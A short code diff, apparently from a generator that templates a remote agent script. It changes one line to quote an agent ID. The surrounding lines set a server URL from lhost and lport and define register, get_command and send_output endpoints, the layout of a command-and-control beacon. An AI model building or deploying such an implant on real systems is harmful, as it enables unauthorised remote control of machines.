@@ -200,7 +200,7 @@ headers = {{
 }}
 
 SERVER_URL = 'http://{lhost}:{lport}'
-AGENT_ID = {agent_id}
+AGENT_ID = '{agent_id}'
 REGISTER_ENDPOINT = f'{{SERVER_URL}}/register'
 COMMAND_ENDPOINT = f'{{SERVER_URL}}/get_command'
 OUTPUT_ENDPOINT = f'{{SERVER_URL}}/send_output'
